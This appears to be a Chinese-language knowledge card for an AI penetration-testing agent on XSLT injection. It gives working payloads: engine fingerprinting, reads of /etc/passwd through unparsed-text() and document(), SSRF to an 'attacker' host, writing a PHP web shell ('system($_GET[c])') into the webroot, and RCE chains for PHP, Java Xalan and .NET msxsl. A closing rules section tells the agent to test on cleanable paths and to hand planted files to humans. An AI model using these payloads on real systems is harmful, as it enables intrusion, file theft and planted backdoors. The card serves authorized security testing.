---
id: xslt-injection
title: XSLT 注入（厂商指纹/document 文件读/三平台 RCE）
tags: xslt,注入,rce,xml,s4
---
# XSLT 注入（XML 样式表可控场景）

**进入条件**：应用接受用户提供的 XSLT 样式表（导入/转换功能、CMS 模板、XML 渲染管道）。

## 一、指纹判别（先判引擎再选 payload）

`<xsl:value-of select="system-property('xsl:vendor')"/>` → Xalan(Java)/Saxon(Java/.NET)/libxslt(PHP)/MSXML(.NET) 判别；`system-property('xsl:version')` 看版本。

## 二、信息泄露

文件读：`<xsl:value-of select="unparsed-text('/etc/passwd')"/>`（XSLT 2.0）或 `<xsl:copy-of select="document('/etc/passwd')"/>`；SSRF：`document('http://attacker/probe')`。

## 三、任意文件写 → RCE

EXSLT 扩展：`<exploit:document href="/var/www/html/shell.php" method="text">内容</exploit:document>`（写 webroot/cron 路径）。**三平台 RCE**：PHP `php:function('file_put_contents','x.php','<?php system($_GET[c]);?>')`（需注册 PHP 函数）；Java Xalan `rt:getRuntime()` 模板链；.NET `msxsl:script` 内嵌 C# `Process.Start`。

## 四、纪律

document()/exslt 写点先指向**自建可清理路径**证明能力；判据以回读内容/命令回显为准；无扩展权限时如实降级为文件读/SSRF 定级。**处置口径（v5.1 对齐全域驻留铁律）：写入的驻留文件一律只登记四元组移交《需人工清理清单》，禁止智能体自行删除**（loop-core 清理铁律/webshell-memshell 第四节同源）。
